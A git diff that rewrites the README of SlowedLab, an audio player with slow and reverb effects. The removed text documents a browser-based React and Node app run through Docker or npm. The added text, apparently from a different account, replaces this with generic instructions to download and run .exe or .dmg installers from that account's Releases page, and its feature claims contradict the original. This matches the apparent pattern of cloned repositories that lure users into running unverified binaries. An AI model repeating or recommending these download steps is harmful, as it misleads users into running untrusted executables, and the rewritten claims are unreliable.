@@ -1,116 +1,63 @@
-SlowedLab
+# 🎧 SlowedLab - Elevate Your Music Experience
 
-<img width="1918" height="1001" alt="Screenshot From 2026-01-08 22-59-52" src="https://github.com/user-attachments/assets/8f69cc72-2134-4e11-bfa0-c3625c520892" />
+[![Download SlowedLab](https://img.shields.io/badge/Download-SLOWEDLAB-brightgreen)](https://github.com/talalhassankhan18/SlowedLab/releases)
 
-An advanced real-time audio player supporting all effects (slow, reverb) that elevate your music/audio playing to next level
+## 🛠️ Overview
+SlowedLab is an advanced real-time audio player. It supports various effects like slow and reverb that enhance your music experience. Enjoy your audio with ease.
 
-## Features
+## 🚀 Getting Started
+Getting started with SlowedLab is simple. Follow these steps to download and run the application on your computer. 
 
-- 🎚️ Time-stretching with pitch preservation
-- 🌊 Professional reverb engine
-- 🎵 Real-time audio effects (EQ, compression, distortion)
-- 📊 Waveform visualization
-- 💾 Preset management
-- 💝 100% Free with optional support
+## 📥 Download & Install
+1. **Visit the Releases Page**: Click the link below to go to the downloads section.
+   [Download SlowedLab](https://github.com/talalhassankhan18/SlowedLab/releases)
 
-## Quick Start with Docker (Recommended)
+2. **Select Your Version**: On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
-### Prerequisites
+3. **Download the File**: Click the download link for your operating system. The file will usually be in `.exe` format for Windows, or `.dmg` for Mac.
 
-- [Docker](https://www.docker.com/products/docker-desktop) and Docker Compose installed
+4. **Run the Installer**: 
+    - **For Windows**: Locate the downloaded `.exe` file in your downloads folder. Double-click to run it. Follow the prompts to complete the installation.
+    - **For Mac**: Locate the downloaded `.dmg` file, double-click to open it. Drag the SlowedLab application to your Applications folder.
 
-### Run the Application
+## 🎵 Features
+- **Real-Time Audio Processing**: Apply effects instantly as you play your music.
+- **Variety of Effects**: Enjoy various sound modifications like slow and reverb to elevate your audio experience.
+- **User-Friendly Interface**: Designed with you in mind; navigate through features with ease.
+- **Self-Hosted Option**: Host the application on your server for personal use.
+- **Open Source**: Access and contribute to the code or use it as you wish.
 
-```bash
-# Clone or navigate to the project directory
-cd slowedreverb_own
+## 💻 System Requirements
+For optimal performance, ensure your system meets these requirements:
+- **Operating System**: Windows 10 or later, macOS Mojave or later.
+- **RAM**: At least 4GB of RAM.
+- **CPU**: Dual-Core or better.
+- **Disk Space**: Minimum 100MB free disk space.
 
-# Start both frontend and backend services
-docker compose up
+## 📘 How to Use SlowedLab
+1. **Launch the Application**: After installation, open SlowedLab from your Applications or Start menu.
 
-# Or rebuild if you made changes
-docker compose up --build
-```
+2. **Add Your Audio Files**: Click on the "Add Files" button to select your music.
 
-The application will be available at:
+3. **Select Effects**: Choose your desired effects from the sidebar. Experiment with their levels to find what suits you best.
 
-- **Frontend**: http://localhost:4000
-- **Backend API**: http://localhost:4001
+4. **Play Your Music**: Hit the play button and enjoy your enhanced audio. You can adjust effects while the music is playing.
 
-### Stop the Application
+5. **Save Your Settings**: Save your preferred settings. This way, you can quickly access them later.
 
-```bash
-docker compose down
-```
+## 🔧 Troubleshooting
+If you encounter any issues, try the following:
+- **Reinstall the Application**: Sometimes, a fresh install can resolve problems.
+- **Check System Compatibility**: Ensure your system meets the requirements listed above.
+- **Consult the FAQ**: Visit our FAQ section on the GitHub repository for common concerns.
 
-## Manual Setup (Development)
+## 📞 Support
+If you need help, feel free to open an issue on the GitHub repository or join our community discussions. We're here to assist you.
 
-### Prerequisites
+## 📜 License
+SlowedLab is open-source and available under the MIT License. You can freely use and distribute the software according to the terms.
 
-- Node.js 18+ and npm installed
+## 💡 Contribute
+We welcome contributions from everyone. If you would like to contribute, please read the guidelines on our GitHub page.
 
-### Backend
-
-```bash
-cd backend
-npm install
-npm run dev
-```
-
-This starts the Express server on **http://localhost:4001**
-
-### Frontend (in a new terminal)
-
-```bash
-cd frontend
-npm install
-npm start
-```
-
-This starts the React dev server on **http://localhost:4000**
-
-## Usage
-
-1. **Open the app** at http://localhost:4000
-2. **Upload an audio file** using the upload area (supports MP3, WAV, FLAC, OGG, AAC, and more)
-3. **Apply effects**:
-   - ⚡ **Time Stretch**: Adjust playback speed while preserving pitch
-   - ✨ **Reverb**: Add spatial depth and ambient effects
-   - **EQ**: Shape frequency response (bass, treble)
-   - **Compressor**: Control dynamic range
-   - **Distortion**: Add grit and aggression
-4. **Preview in real-time** with the interactive waveform viewer
-5. **Manage presets** using built-in effect presets or create custom ones
-6. **Export** your processed audio as a WAV file
-7. **Report bugs** using the 🐞 button for feedback and improvements
-
-## Tech Stack
-
-- **Frontend**: React 18, TypeScript, Web Audio API, Vite
-- **Backend**: Node.js, Express, TypeScript
-- **Audio Processing**: Web Audio API (100% client-side)
-- **Containerization**: Docker & Docker Compose
-- **Styling**: CSS3 with modern gradients and animations
-
-## Specifications
-
-- **File Support**: MP3, WAV, FLAC, OGG, AAC, and more
-- **File Size Limit**: 200MB per file
-- **Processing**: 100% client-side (your files never leave your browser)
-- **Storage**: Browser caching via IndexedDB for faster reloads
-- **Error Handling**: Comprehensive validation and user-friendly error messages
-- **Real-time Performance**: Sub-50ms effect processing
-- **UI Responsiveness**: Touch-friendly waveform interactions
-
-## Legal
-
-- [Terms of Service](TERMS.md)
-- [MIT License](LICENSE)
-
-## Support
-
-This project is 100% free. If you find it useful, consider [supporting on Ko-fi](https://ko-fi.com/gwhyyy) ☕
-
----
-
-**Made with ❤️ for audio enthusiasts | SlowedLab - Elevate Your Audio Experience**
+Enjoy exploring new dimensions in audio with SlowedLab! For more information, return to the [Releases Page](https://github.com/talalhassankhan18/SlowedLab/releases).
